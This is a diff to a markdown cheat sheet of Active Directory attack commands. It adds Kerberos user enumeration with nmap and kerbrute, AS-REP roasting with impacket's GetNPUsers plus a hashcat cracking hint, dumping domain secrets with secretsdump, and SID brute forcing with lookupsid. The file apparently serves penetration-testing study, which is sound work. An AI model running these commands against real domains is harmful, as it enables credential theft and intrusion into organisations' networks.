@@ -8,6 +8,10 @@ https://www.xmind.net/m/5dypm8/
 ```bash
 nmap -n -sV --script "ldap* and not brute" -p 389 $ip -Pn
 ```
+- enumerate users
+```bash
+nmap -p 88 --script=krb5-enum-users --script-args="krb5-enum-users.realm='$dom',userdb=/opt/wordlist/list.txt" $ip
+```
 
 ### enum4linux
 - list share, get domain name etc..
@@ -42,17 +46,24 @@ ldapsearch -LLL -x -H ldap://$ip -b "dc=domain,dc=local" -s base '(objectclass=*
 
 ### kerbrute
 ```sh
-kerbrute userenum --dc $ip -d $dom /path/to/userlist
+kerbrute userenum --dc $ip -d $dom /path/to/list.txt
 ```
 
 ### impacket
-- ASRepRoast
+- check asreproast for a list of user
 ```sh
-/usr/local/bin/GetNPUsers.py domain.tld/ -dc-ip domaincontroller -usersfile validuserlist
+GetNPUsers.py domain.tld/ -dc-ip $ip -usersfile /path/to/list.txt
+
+GetNPUsers.py -usersfile /path/to/list.txt -format hashcat -outputfile hashes.asreproast -dc-ip $ip $dom/
+# crack the hash with hashcat -m 18200
 ```
-- Dump Secret
+- dump secret
 ```sh
-/usr/local/bin/secretsdump.py -dc-ip 0.0.0.0 domain.tld/username:password@0.0.0.0
+secretsdump.py -dc-ip 0.0.0.0 domain.tld/username:password@0.0.0.0
+```
+- brute force domain sids
+```bash
+lookupsid.py anonymous@$ip
 ```
 
 ### bloodhound
